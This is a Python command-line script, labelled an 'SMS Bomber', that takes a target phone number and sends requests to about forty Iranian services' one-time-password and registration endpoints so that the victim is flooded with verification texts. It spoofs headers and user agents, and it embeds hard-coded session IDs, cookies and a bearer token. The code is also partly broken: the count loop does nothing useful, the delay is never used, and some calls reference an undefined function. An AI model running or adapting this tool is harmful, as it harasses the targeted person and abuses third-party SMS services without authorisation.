import tkinter as tk
from tkinter import messagebox
from threading import Thread
from requests import post, get
import random
import time
import pyuseragents
import argparse
# ============================================================ #

def SMS(Phone, count, delay):
    for i in range(count) : 
        xos = pyuseragents.random()
    header = {"content-type":"application/json","user-agent":xos}
    user_agent = random.choice([
        "ZarinPal/4.0 (Android Mobile; Android 7.1.0;samsung samsung;A30;ZarinPalApp-V4/4.0.51) ZarinPalApp-V4/4.0.51",
        "ZarinPal/4.0 (Android Mobile; Android 7.1.0;samsung samsung;A50;ZarinPalApp-V4/4.0.51) ZarinPalApp-V4/4.0.51",
        "ZarinPal/4.0 (Android Mobile; Android 6.0.1;samsung samsung;A10;ZarinPalApp-V4/4.0.51) ZarinPalApp-V4/4.0.51"
        ])
    session_id = random.choice([
        "MTM0MjAzMDg0MjE5MTI6NTk4YmQ4ZGQyYzFlNTMzNDY0YTUxMzA3Y2UzODZhMGM",
        "MTU0MjAzMDg0MjE5MTI6NTk4YmQ4ZGQyYzFlNTMzNDY0YTUxMzA3Y2UzODZhMGM"
        ])
    DigiKalaHeader = {
            "Host": "sirius.digikala.com",
            "client": "android",
            "clientid": "5e40e4fd2985c2cf",
            "applicationversion": "85",
            "pixelratio": "1.3312500715255737",
            "x-bellatrix": "true",
            "credentials": "include",
            "supernova-optimize-response": "1",
            "user-agent": xos,
            "sessionid": session_id + "\u003d",
            "globaluserid": session_id + "\u003d",
            "authorization": "",
            "content-type": "application/json",
            "content-length": "49",
            "accept-encoding": "gzip",
            "cookie": "tracker_global\u003d4F5w6KkM; tracker_session\u003d4F5w6KkM; TS0117d8ef\u003d0102310591a6123c029563c8cd84ffbefc12e8cb115acde3c55e4cce3bddaea94b478bbb6e3a14265adf7834c9e4c1c37cfc76dfcc819557b0ffe03414133dab7a1a75dac27f83fafae405fe76c5dfdcb3a398e3c8"
    }
    ZarinHeader = {
            "Host": "next.zarinpal.com",
            "accept": "application/json",
            "user-agent": user_agent,
            "content-type": "application/json; charset\u003dUTF-8",
            "content-length": "80",
            "accept-encoding": "gzip"}
    try:
        post(url="https://sabziman.com/wp-admin/admin-ajax.php",data=f"action=newphoneexist&phonenumber=0{Phone}", timeout=5,
             headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '44','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://sabziman.com','referer': 'https://sabziman.com/%D8%B3%D9%88%D8%A7%D9%84%D8%A7%D8%AA-%D9%85%D8%AA%D8%AF%D8%A7%D9%88%D9%84/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': xos,'x-requested-with': 'XMLHttpRequest'})
    except:
        pass
# -------------------------------------------
    try:
        post(url="https://web.raghamapp.com/api/users/code",json={"phone": f"+98{Phone}"}, headers={"user-agent": xos}, timeout=5)
    except:
        pass
# -------------------------------------------
    try:
        post(url="https://api.ostadkr.com/login",json={"mobile": f'0{Phone}'}, timeout=5)
    except:
        pass
# -------------------------------------------40
    try:
        get(f"https://core.gap.im/v1/user/add.json?mobile=+{Phone}", 
            headers={"Host": "core.gap.im","accept": "application/json, text/plain, */*","x-version": "4.5.7","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","appversion": "web","origin": "https://web.gap.im","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.gap.im/","accept-encoding": "gzip, deflate, br"}
            , timeout=5)
    except:
        pass
# -------------------------------------------39
    try:
        post("https://next.zarinpal.com/api/oauth/register", headers=ZarinHeader, 
             json={"first_name":"محمدی","last_name":"حمیدی","cell_number":f"0{Phone}"}, timeout=5).status_code
    except:
        pass
# --------------------------------------38
    try:
        post("https://sirius.digikala.com/v1/user/authentication/", headers=DigiKalaHeader, 
             json={"username":f"0{Phone}","force_send_otp":False}, timeout=5).status_code
    except:
        pass
# --------------------------------------37
    try:
        post("https://api.esam.ir/api/account/RegisterOrLogin", headers={
              "Host": "api.esam.ir",
              "content-type": "application/json; charset\u003dUTF-8",
              "content-length": "110",
              "accept-encoding": "gzip",
              "user-agent": "okhttp/4.5.0"
             }, 
             json={"mobile":f"0{Phone}","present_type":"AndroidApp","registration_method":1,"serialNumber":"5e40e4fd2985e2cf"}, timeout=5).status_code
    except:
        pass
# --------------------------------------36
    try:
        post("https://api-ebcom.mci.ir/services/auth/v1.0/otp", headers={
              "Host": "api-ebcom.mci.ir",
              "authorization": "Bearer",
              "content-type": "application/json; charset\u003dUTF-8",
              "content-length": "49",
              "accept-encoding": "gzip",
              "user-agent": "okhttp/3.14.7"
              }, 
              json={"appcode":"[vzNSAIvMufO]","msisdn":Phone}
        , timeout=5).status_code
    except:
        pass
# --------------------------------------35
    try:
        post("https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/RequestActivationCode", headers={
                   "Host": "application2.billingsystem.ayantech.ir",
                   "user-agent": xos,
                   "content-type": "application/json; charset\u003dUTF-8",
                   "content-length": "139",
                   "accept-encoding": "gzip"
                   }, timeout=5,json={"Parameters":{"ApplicationType":"Android","ApplicationUniqueToken":"playstore","ApplicationVersion":"1.3.0","MobileNumber":f"0{Phone}"}}).status_code
    except:
        pass
# --------------------------------------34
    try:
        post("https://newapi.zoodfood.com/mobile/v2/user/loginMobileWithNoPass", headers={
                  "Host": "newapi.zoodfood.com",
                  "authorization": "Bearer eyl0eXAiOiJKV1QiLCjhbGciOiJSUzI1NiIhImp0aSI6IjAwODRiNzdiMmMxNTljOTVlMDJhYjBhZTM5YTk3N2ZjOWE4YmNiODM5NWRmMzM2ZmYxYzVhZThkZmQ3NDJiYmM2NTIwNTAwY2I4YzY5MjA4In0.eyJhdWQiOiJzbmFwcGZvb2RfYW5kcm9pZCIsImp0aSI6IjAwODRiNzdiMmMxNTljOTVlMDJhYjBhZTM5YTk3N2ZjOWE4YmNiODM5NWRmMzM2ZmYxYzVhZThkZmQ3NDJiYmM2NTIwNTAwY2I4YzY5MjA4IiwiaWF0IjoxNjQyMDM0NjcxLCJuYmYiOjE2NDIwMzQ2NzEsImV4cCI6MTY0NDcxMzE5MSwic3ViIjoiIiwic2NvcGVzIjpbIm1vYmlsZV92MiIsIm1vYmlsZV92MSIsIndlYnZpZXciXX0.EeX-Aq8BEYObsjoU24lA7V5fM5MjnbvYSsd98hReWwBU36P3noDGcGM4hBAmWGzxTMOl7ZOyYAIydGjJh8YMJavE1JxAyUTdxfeKvGBONmNqLnpWy1aAtRjwAtvA33Vk5xaR-mDve2bLRYRivKa8X-TrJeaS8BewDR3edaXgoCfheRNBr6Yhtr11EqoQXVNqFqYcDvI0Y5B_QXFdTHBttZDrpgHkaHoyJwpsGi9H2y3O303Lct-xWvDcRuBh0DNA73aH9-pUCPV-hw697NzRY6e4lyf3i1QmPoduauekpPC7Pnlg-wZMjjF3U2qi0GXFB4Z515Vc8PxjXgze1gY8v4pEyc6H-m5KkoOmVL5d_7uvXn6UFNAc2rDfBIFC9UcbDFA8ZkW9NEADgwy1Av6ULT9WtXjUOgkLMmL-5K4bBY2VB-2Xr5EAr-Grf4ZIFELmou4cW9Pq9DqOuCoPocsb1d2xjgBzeNHj-iBhw6wWzqZi2N5amkxjl_ehv6UmEl6LVK4AzOXSsQUdCz-1tQdQP-AUVfOdhoggQGgM4e9KgI1vJCfxb2IEnIyM-6kIF3W3_M4zaAy6R7wg9_pr1BsAr07K4M4GmxKD1YAEAbTIvq7556XT6yETdQdBupKO3umuMr-3tLC4Hy_Y3yBGO9XwHR9Hk1QaU4q7IbAY8_a0xCHXtLdptbs5JQwDWPzxlgjJ_sv-aEAZg46CsISmA_wZ922Xr-rOABwYaYOdoXMXhZyEDQI0UuVv85pxgKs6SAV6497ToUl5w_r8CW5n0TAqcEQKL3Ul2rKnFDH4VJwZ9PhSqXy1DI52VFY5a7sHjhq-fL-JWK5V71_U98D8V6ofVuquc_dU9nU_0bdcMTHxpp-r-7Ob9pxh_szC7_nfoC9wAb9VfJ_mClL5g5RvE42bHkqb2Hop8SXjKj8pLOoTIk23_Bn7xTjcatygohvP1IDqVQTzqZp6rBz4egGlFtgr4fnRGbmfANADqADVqeux58vl6ESF6SOmT6Z2cvMZT6jOaD16deqxmX9Josq7CQ1koMwSwfoV-XGaYI66ztcIpgxw-bl41LSME9EKelxmCuuG5HhTKzmm9Co_FpM8Y8OYu9Liy4rqWu_vGAuyDgT7G0i9YCAvUuXE4x88Jo0BU-862twHja8kimpKC3IYNg_oQ6Eh2e2j3FJWRsD9f0eNGzFvc5IvVZVdHQ1dT2vV3abeAngdyDu579grHlK1_K5yE0CLfsMn7y9CkGfHKumTQIO4MI9FQJeAbk0FwneclIiNkTkgoimGe02gV87ED1Y-vjHdgZd5lPBJyMzP6DQInR7VzEgawZfKGseqdHzxhoVmx73AGGdSEx-AF2iHUt7vOx1eBNsb8yexzTMwpATjT7GskKUwhzug8fXZ-vw5bHRKyPRKlaB14tUSmv_C9ITqo3Z7XRr7iRn1jqYwcWPT0pukmbILNl6LF1A9G9GXxCDM07aJcm1ou0ZbI3nwAHjOn0nuUpB_GMrTLRgezC3rxn3RoAWlcxieeFAC6ln9adQkb9XlWHYnunxHx9ITrTBcabv9KkFjRQynKi7KXCTakpjRatJ1R32QeKcCLhPjdeHAvvOQ_WLiMvISHvLUYGIOvyv8DDqEb1-YcFavJH3ZYD_FryNXX5S8LA5V0t7XR16hb0iQAgHuhREW6LSQRiR-ob16Q9ZJyteU_Bzge6DP_qG0AQf-8QI7dJkBUviAGlM_Idnpgqc2_lQ6N2q3GUQ4J4vUpLV6tAOuzBn-I8X8jtKS0Nn1aB0NtPBb_jNN_dV9BPQq5pRbPyFRaEGoCj8a_5iGsLhH7PUPmeYzQ7IJPvH_2phLPqoaIr_xsTzM3Q-QCi_nfD_vv8JPgka6P7NSDfIyUY2ShdjZPT_BhZdBJfmokzXvuhu7K5jAETcZ-mFvuL3LWvQ4zwgGRJLCesiQgp-2VGdfLAPTR2g61J5xrRQNnAzz537avHAMCVncGQoV386QpGbpr76lR5IaIQxdjAopYv9y1mzDkUms0QnZLyrKUik0e6UtML9p4FgqombT5ZC8m3Svmw-N0KRq4IHjXkNA_jedrDmOcL5NUpJq2oKHUtFQLCqvxqVotM7CqJj_yLdh6_sSl26e8g6uU-uHmvGhu2hzxbOMMnFILFk3dHqEs3gSy0nMjRhDpHEPFuyvkNtkLMprzI65sIDF6BpD5shTf_NWrXC7rr8NawBhTka49fdrwthJrgodtNfMBxQ8XvWnS9BbtU8fo0DV4VfYlAlP4qC0sSUwYPrgG1z3VHz_xfDic2gqP1O-n_Pa6V_s9m2ooHjzsUyvcR5QacuzJtR0A32u05T8tg5U_iPyT5TyBBEpZ8IHutqh5YLT40Cu2patY5Zr2CZH_H3DvUZe4rOg10P7ibdeNJ9y_toaxu7ZGjy01C8NUv1pMZYyp2eFsid86zZX99JLwYhcJBqYehVXkVKBqagvko8uQzJ7ALvqEDseLLHkIbEYLfvygoM-va2VFy0tO_66BU5UlE-UHyxs8v6LpvsLHsigcP8gSwvZyVaRMyS7IdyAZJi_so4gmwuDjrTDI4hivgV1P2IS3nuVOcNV3NxfcirT6iyHjDQefSNNNbxdSUFgze-towtMjpHpGNFm-ujaZ6Ad04Xaba69S1rBRl3yFjPn-k8MW-Xw4P6GN5VOgrfAAWO3TvZqR_Yru4CtYihzvvEdtmgnSIyj4WqFM7Ny5NNnTPEg8Co",
                  "content-type": "application/x-www-form-urlencoded",
                  "content-length": "158",
                  "accept-encoding": "gzip",
                  "user-agent": "okhttp/3.12.12"
                 }, data={"cellphone":Phone}, timeout=5).status_code
    except:
        pass
# --------------------------------------33
    try:
        post("https://tap33.me/api/v2/user", headers={
                   "Host": "tap33.me",
                   "Connection": "keep-alive",
                   "Content-Length": "63",
                   "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
                   "content-type": "application/json",
                   "Accept": "*/*",
                   "Origin": "https://app.tapsi.cab",
                   "Sec-Fetch-Site": "cross-site",
                   "Sec-Fetch-Mode": "cors",
                   "Sec-Fetch-Dest": "empty",
                   "Referer": "https://app.tapsi.cab/",
                   "Accept-Encoding": "gzip, deflate, br",
                   "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"
                   }, json={"credential":{"phoneNumber":f"0{Phone}","role":"PASSENGER"}}, timeout=5).status_code
    except:
        pass
# --------------------------------------32
    try:
        post("https://www.sheypoor.com/api/v10.0.0/auth/send",json={"username":f"0{Phone}"},headers=header, timeout=5).status_code
    except:
        pass
# --------------------------------------31
    try:
        post("https://app.snapp-box.com/api/v2/auth/otp/send",headers=header,json={"phoneNumber":f"0{Phone}"}, timeout=5).status_code
    except:
        pass
# --------------------------------------30
    try:
        post("https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.794&long=53.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=53e13b13-8b47-43ed-bf93-d7343a7b8d0f&locale=en",
                        data={"cellphone":f"0{Phone}"}, timeout=5).status_code
    except:
        pass
# --------------------------------------29
    try:
        post("https://api.tapsi.cab/api/v2/user",headers=header,json={"credential":{"phoneNumber":f"0{Phone}","role":"PASSENGER"}}, timeout=5).status_code
    except:
        pass
# --------------------------------------28
    try:
        post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",headers=header,json={"cellphone":f"+98{Phone}"}, timeout=5).status_code
    except:
        pass
# --------------------------------------27
    try:
        post("https://api.divar.ir/v5/auth/authenticate",headers=header,json={"phone":Phone}, timeout=5).status_code
    except:
        pass
# --------------------------------------26
    try:
        get(f"https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{Phone}", timeout=5).status_code
    except:
        pass
# --------------------------------------25
    try:
        options("https://api.sibche.com/profile/sendCode",headers=header)
        post("https://api.sibche.com/profile/sendCode",headers=header,json={"mobile":f"0{Phone}"}, timeout=5).status_code
    except:
        pass
# --------------------------------------24
    try:
        options("https://api.zarinplus.com/user/zarinpal-login",headers=header)
        post("https://api.zarinplus.com/user/zarinpal-login",headers=header,json={"phone_number":f"98{Phone}"}, timeout=5).status_code
    except:
        pass
# --------------------------------------23
    try:
        options("https://ws.alibaba.ir/api/v3/account/mobile/otp",headers=header)
        post("https://ws.alibaba.ir/api/v3/account/mobile/otp",headers=header,json={"phoneNumber":Phone}, timeout=5).status_code
    except:
        pass
# --------------------------------------22
    try:
        post("https://api1.safaremoon.com/auth/login",headers=header,json={"phoneNumber":f"0{Phone}"}, timeout=5).status_code
    except:
        pass
# --------------------------------------21
    try:
        get(f"https://core.gap.im/v1/user/add.json?mobile=%2B98{Phone}", timeout=5).status_code
    except:
        pass
# --------------------------------------20
    try:
        post("https://hamrahcard.ir/wp-admin/admin-ajax.php",data={"action":"getAppViaSMS","number":f"0{Phone}"}, timeout=5).status_code
    except:
        pass
# --------------------------------------19
    try:
        post("https://uiapi.saapa.ir/api/otp/sendCode",json={"mobile":f"0{Phone}"}, timeout=5).status_code
    except:
        pass
# --------------------------------------18
    try:
        options("https://lottery.rayanertebat.ir/api/User/Otp?t=1650423280427")
        post("https://lottery.rayanertebat.ir/api/User/Otp?t=1650423280427",headers=header,json={"mobileNo":f"0{Phone}"}, timeout=5).status_code
    except:
        pass
# --------------------------------------17
    try:
        post(f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{Phone}", timeout=5).status_code
    except:
        pass
# --------------------------------------16
    try:
        post("https://www.snapptrip.com/register",headers=header,json={"lang":"fa","country_id":"860","password":"asdads123","mobile_phone":f"0{Phone}","country_code":"+98","email":"sdasd21893128@gmail.com"}, timeout=5).status_code
    except:
        pass     
# --------------------------------------15
    try:
        post("https://sahabapps.com/SahabSite_Controller/Verify_MobileNumber_Register_c/",data={"mobile":f"0{Phone}"}, timeout=5).status_code
    except:
        pass
# --------------------------------------14
    try:
        post("https://api-react.okala.com/C/CustomerAccount/OTPRegister",
             json={"mobile":f"0{Phone}","deviceTypeCode":0,"confirmTerms":True,"notRobot":True},headers=header, timeout=5).status_code
    except:
        pass
# --------------------------------------13
    try:
        options("https://api.timcheh.com/auth/otp/send",headers=header, timeout=5)
        post("https://api.timcheh.com/auth/otp/send",headers=header,json={"mobile":f"0{Phone}"}, timeout=5).status_code
    except:
        pass
# --------------------------------------12
    try:
        options("https://mobapi.banimode.com/api/v2/auth/request",headers=header, timeout=5)
        post("https://mobapi.banimode.com/api/v2/auth/request",headers=header,json={"phone":f"0{Phone}"}, timeout=5).status_code
    except:
        pass
# --------------------------------------11
    try:
        post("https://rojashop.com/api/auth/checkIsRegister",data={"mobile":f"0{Phone}"}, timeout=5)
        post("https://rojashop.com/api/auth/sendOtp",data={"mobile":f"0{Phone}"}, timeout=5).status_code
    except:
        pass
# --------------------------------------10
    try:
        post("https://web.baneeh.com/mobilelogin/mobilelogin/sendotp",
             data={"mobilenumber":f"0{Phone}","logintype":"register","resendotp":"0","oldmobile":"0"}, timeout=5).status_code
    except:
        pass
# --------------------------------------9
    try:
        post("https://www.jeanswest.ir/first-order-api/?api=register",data={"mobile":f"0{Phone}"}, timeout=5).status_code 
    except:
        pass
# --------------------------------------8
    try:
        post("https://www.khanoumi.com/accounts/sendotp" ,data={"mobile":f"0{Phone}","redirectUrl":"/"}, timeout=5).status_code    
    except:
        pass     
# --------------------------------------7
    try:
        get(f"https://bccstyle.com/login-otp?mobile=0{Phone}", timeout=5).status_code
    except:
        pass
# --------------------------------------6
    try:
        post("https://qazvinkharid.com/livewire/message/login-form" ,
              timeout=5,headers=header,json={"fingerprint":{"id":"LewbsgxFvWEQJNiScqET","name":"login-form","locale":"en","path":"/","method":"GET"},"serverMemo":{"children":[],"errors":[],"htmlHash":"94cc2ca4","data":{"errormobile":False,"citySection":[[],[],[],[],[]],"mobile":None,"melicode":None,"personcode":None,"code":None,"firstname":None,"lastname":None,"gender":None,"user":None,"step":0,"temp":0,"retry":0},"dataMeta":{"modelCollections":{"citySection":{"class":"App\\Models\\CitySection","id":[1,2,3,4,36],"relations":[],"connection":"pgsql"}}},"checksum":"2a1362e3f930befbe285a31c390cea51b3a63b37d98c28252dea7d3f3340d4c6"},"updates":[{"type":"syncInput","payload":{"name":"mobile","value":"0"+Phone}},{"type":"callMethod","payload":{"method":"submitLogin","params":[]}}]}).status_code
    except:
        pass
# --------------------------------------5
    try:
        post("https://adak.shop/?wc-ajax=yith_welrp_form_action" ,
             data={"user_login":"0"+Phone,"origin":"/","additional":"1","context":"frontend"}, timeout=5).status_code
    except:
        pass
# --------------------------------------4
    try:
        options("https://api.malltina.com/profiles",headers=header)
        post("https://api.malltina.com/profiles",
             headers=header,json={"password":"asdasd123","mobile":"0"+Phone,"first_name":"مریم قربانی"}, timeout=5).status_code
    except:
        pass
# --------------------------------------3
    try:
        options("https://www.golsetan.com/wp-json/panel/v1/auth/sendMobileAuth", timeout=5)
        post("https://www.golsetan.com/wp-json/panel/v1/auth/sendMobileAuth",json={"phoneNumber":"0"+Phone},headers=header, timeout=5).status_code
    except:
        pass
# --------------------------------------2
    try:
        options("https://auth.basalam.com/otp-request", timeout=5)
        post("https://auth.basalam.com/otp-request",headers=header,json={"mobile":f"0{Phone}","client_id":12}, timeout=5).status_code
    except:
        pass
# --------------------------------------1
    try:
        get(f"https://darsoo.com/active.php?username=0{Phone}&laravel=b2KyV7za1ZQvRmA0FhsPCxyFeCF86aLIxBnsdelSbUE%3D&register", timeout=5).status_code
    except:
        pass

def main():
    parser = argparse.ArgumentParser(description="SMS Bomber CLI tool")
    parser.add_argument("-p", "--phone", type=str, required=True, help="Phone number to target")
    parser.add_argument("-c", "--count", type=int, default=10, help="Number of messages to send")
    parser.add_argument("-d", "--delay", type=int, default=1, help="Delay between messages in seconds")
    args = parser.parse_args()
    if not any(vars(args).values()):
      print("Welcom to the bomner script. \n Creator : mohammad mohammad soltani \n Licence : MIT \n for the help you can type -h command")
      return
    SMS(args.phone, args.count, args.delay)

if __name__ == "__main__":
    main()